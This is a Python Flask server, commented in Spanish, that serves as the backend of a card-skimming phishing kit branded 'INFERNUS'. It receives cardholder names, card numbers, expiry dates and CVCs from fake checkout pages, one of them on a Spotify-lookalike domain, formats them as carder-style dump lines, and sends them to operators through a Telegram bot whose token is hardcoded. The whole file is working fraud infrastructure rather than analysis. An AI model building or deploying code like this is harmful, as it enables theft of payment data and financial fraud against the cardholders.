import os
from flask import Flask, request, jsonify
import requests
import datetime

app = Flask(__name__)

# --- CONFIGURACIÓN TELEGRAM (DATOS REALES DE TU BOT) ---
TELEGRAM_BOT_TOKEN = '9205817824:AAGIHdN7_3fB49pTgNQzG3UFCXeY898oluU'

# Mapa: Dominio → Usuario Telegram específico (DATOS REALES)
PRIVADO_USERS_MAP = {
    'https://backend-production-d69c4cec.up.railway.app': int(os.environ.get('CLIENTE_ADMIN_ID', '-7707049896')),  # TU BOT ADMIN - RECIBE TODO
    'https://free.spotlfy.xyz/': int(os.environ.get('CLIENTE_1_ID', '-7574919030')),         # CLIENTE 1
}

# Lista maestra: ¿quién más quiere ver? (opcional)
LISTA_MAESTRA_IDS = [int(os.environ.get('CLIENTE_ADMIN_ID', '-7707049896')), int(os.environ.get('CLIENTE_1_ID', '-7574919030'))]

# URL del servidor Flask donde se ejecuta este backend
SERVER_URL = os.environ.get('SERVER_URL', 'https://kezosc-production.up.railway.app')


@app.route('/test', methods=['GET'])
def test_bot():
    """Prueba básica para verificar que el bot está activo"""
    
    try:
        res = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe",  # Verifica tu propio ID
            json={}, timeout=5
        )
        if res.status_code == 200:
            return jsonify({"status": "ok", "msg": "Bot Telegram activo ✅"}), 200
        else:
            return jsonify({"status": "error", "msg": f"Error al conectar con Telegram: {res.text}"}), 500
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 500


@app.route('/ping-pong', methods=['POST'])
def ping_pong():
    """Ruta para recibir mensaje de bienvenida/confirmación cuando se inicia el bot"""
    
    try:
        res = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json={
                "chat_id": str(PRIVADO_USERS_MAP['https://backend-production-d69c4cec.up.railway.app']),
                "text": (
                    f"🔥 *BOT INFERNUS STARTED* 🔥\n"
                    f"━━━━━━━━━━━━━\n\n"
                    f"`⚡ Servidor Flask iniciado\n`"
                    f"`💬 Bot Telegram activo y listo\n`"
                    f"`📌 Dominio: {window.location.origin}\n`"
                    f"**Presiona 'Iniciar suscripción' para recibir tus CC**\n\n"
                    f"_Recibiendo datos en tiempo real..._"
                ), 
                "parse_mode": "Markdown"
            }, timeout=5)
        
        if res.status_code == 200:
            print(f"✅ MENSAJE DE BIENVENIDA ENVIADO (Bot Telegram)")
        else:
            print(f"❌ ERROR AL ENVIAR MENSAJE DE BIENVENIDA: {res.text}")
            
    except Exception as e:
        print(f"❌ EXCEPCIÓN EN PING-PONG: {e}")

    return jsonify({"status": "ok"}), 200


@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    """Recibe datos de tarjeta y los envía al cliente correspondiente"""
    
    data = request.json if request.is_json else {}
    origen_url = data.get('origen', 'unknown')  # 🔥 El dominio del checkout
    
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A').replace(' ', '')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    # Separar mes y año de la fecha de vencimiento
    try:
        if '/' in expiracion:
            mes, ano = expiracion.split('/')
            ano = ano.zfill(4)  # Asegurar formato AAAA (ej: "2026")
        else:
            mes, ano = expiracion, 'N/A'
    except Exception:
        mes, ano = 'N/A', 'N/A'

    # Formato de la tarjeta: NUMERO|MES|AÑO|CVC
    cc_linea = f"{tarjeta}|{mes}|{ano}|{cvc}"

    mensaje_base = (
        f"🔥 *INFERNUS VIP* 🔥\n"
        f"━━━━━━━━━━━━━\n\n"
        f"`{cc_linea}`\n\n"
        f"👤 _{nombre}_"
    )

    # --- LOGICA DE ROUTING: ¿QUIÉN RECIBE? ---
    
    # 1. Verificar si hay un usuario específico para este dominio
    if origen_url in PRIVADO_USERS_MAP:
        usuario_destino = PRIVADO_USERS_MAP[origen_url]
        
        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        
        try:
            payload = {
                "chat_id": str(usuario_destino),  # ✅ Convertir a string para Telegram API
                "text": mensaje_base, 
                "parse_mode": "Markdown"
            }

            res = requests.post(url_telegram, json=payload, timeout=5)
            
            if res.status_code == 200:
                print(f"✅ ENVIADO A {usuario_destino} (Dominio: {origen_url})")
            else:
                print(f"❌ ERROR TELEGRAM ({usuario_destino}): {res.text}")
                
        except Exception as e:
            print(f"❌ EXCEPCIÓN TELEGRAM: {e}")

    # 2. Fallback: ¿Quién más quiere ver? (Admin recibo TODO)
    else:
        admin_user = PRIVADO_USERS_MAP.get('https://backend-production-d69c4cec.up.railway.app')
        
        if admin_user:
            url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            
            payload = {
                "chat_id": str(admin_user),  # ✅ Tu bot Z siempre recibe TODO
                "text": mensaje_base, 
                "parse_mode": "Markdown"
            }
            
            try:
                res = requests.post(url_telegram, json=payload, timeout=5)
                
                if res.status_code == 200:
                    print(f"✅ ENVIADO A ADMIN {admin_user} (Dominio no registrado)")
                else:
                    print(f"❌ ERROR TELEGRAM AL ADMIN: {res.text}")
            except Exception as e:
                print(f"❌ EXCEPCIÓN RED: {e}")

    return jsonify({"status": "success", "enviados": 1}), 200


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print("=" * 60)
    print(f"🚀 INICIANDO SERVIDOR FLASK...")
    print(f"🔥 TOKEN: {TELEGRAM_BOT_TOKEN}")
    print(f"📦 MAPA DE USUARIOS:")
    for dominio, user_id in PRIVADO_USERS_MAP.items():
        print(f"   - {dominio} → {user_id}")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=port)
